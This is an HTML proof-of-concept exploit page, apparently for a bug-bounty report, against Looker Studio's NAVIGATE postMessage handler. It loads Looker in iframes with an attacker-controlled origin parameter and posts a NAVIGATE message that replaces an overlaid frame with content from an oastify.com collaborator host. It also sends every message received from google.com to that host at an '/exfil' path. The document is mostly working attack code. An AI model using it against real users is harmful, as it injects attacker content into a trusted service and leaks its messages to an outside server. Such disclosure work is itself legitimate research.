<!DOCTYPE html>
<html>
<head><title>Looker Studio - Arbitrary Iframe Injection PoC</title></head>
<body style="margin:0;padding:20px;font-family:Arial;">
<h2>Looker Studio - Arbitrary Iframe Injection via NAVIGATE postMessage</h2>
<p>Looker Studio is loaded in an iframe with <code>liu=</code> attacker origin. A second smaller iframe (also Looker) is overlaid on top — the NAVIGATE handler replaces its content with the attacker's collaborator, visually proving injection inside the Looker context.</p>
<hr>

<div id="container" style="position:relative;width:100%;height:500px;border:1px solid #333;">
    <!-- Main Looker iframe - full size, stays untouched -->
    <iframe id="lookerMain" style="width:100%;height:100%;border:none;"></iframe>

    <!-- Injection iframe - small, overlaid on bottom-right to look "inside" Looker -->
    <iframe id="lookerInject" style="position:absolute;bottom:15px;right:15px;width:350px;height:200px;border:2px solid #e94560;border-radius:6px;z-index:9999;background:#fff;"></iframe>
</div>

<h3>Log</h3>
<pre id="log" style="background:#111;color:#0f0;padding:10px;max-height:300px;overflow-y:auto;font-size:12px;"></pre>

<script>
var ATTACKER_ORIGIN = window.location.origin;
var COLLABORATOR = 'https://7z7kqkxfeu6suua3sb1vsor2ltrkfd32.oastify.com';
var REPORT_URL = 'https://lookerstudio.google.com/reporting/be06bd59-7ae1-4373-825c-075088ba0d51/page/p0/appview';

function logMsg(msg) {
    var pre = document.getElementById('log');
    pre.textContent += '[' + new Date().toISOString().split('T')[1].split('.')[0] + '] ' + msg + '\n';
    pre.scrollTop = pre.scrollHeight;
}

function buildUrl() {
    var u = new URL(REPORT_URL);
    u.searchParams.set('liu', ATTACKER_ORIGIN);
    u.searchParams.set('release', 'r3');
    u.searchParams.set('lem', 'true');
    return u.toString();
}

window.addEventListener('message', function(e) {
    var data = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
    logMsg('RECV [' + e.origin + ']: ' + data.substring(0, 500));

    if (e.origin.indexOf('google.com') !== -1) {
        new Image().src = COLLABORATOR + '/exfil?d=' + encodeURIComponent(data.substring(0, 300));
    }
});

var targetUrl = buildUrl();

// Load main Looker iframe (stays visible, untouched)
logMsg('Loading main Looker iframe (stays visible)...');
document.getElementById('lookerMain').src = targetUrl;

// Load small overlay iframe (also Looker, will be NAVIGATEd)
logMsg('Loading injection iframe (will be replaced via NAVIGATE)...');
var injectFrame = document.getElementById('lookerInject');
injectFrame.src = targetUrl;

var injected = false;
injectFrame.onload = function() {
    if (injected) return;
    injected = true;
    logMsg('Injection iframe loaded. Waiting 5s for Angular bootstrap...');

    setTimeout(function() {
        logMsg('Sending NAVIGATE to replace injection iframe with Collaborator content...');

        injectFrame.contentWindow.postMessage(JSON.stringify({
            type: 'NAVIGATE',
            payload: { url: COLLABORATOR + '/injected-inside-looker?proof=navigate-handler' }
        }), '*');

        logMsg('NAVIGATE sent. The small iframe should now show Collaborator content overlaid on Looker.');
        logMsg('Collaborator will receive request with Referer: https://lookerstudio.google.com/');
    }, 5000);
};

setTimeout(function() {
    if (!injected) {
        injected = true;
        logMsg('Timeout fallback — sending NAVIGATE anyway...');
        injectFrame.contentWindow.postMessage(JSON.stringify({
            type: 'NAVIGATE',
            payload: { url: COLLABORATOR + '/injected-inside-looker?proof=timeout-fallback' }
        }), '*');
    }
}, 15000);
</script>
</body>
</html>
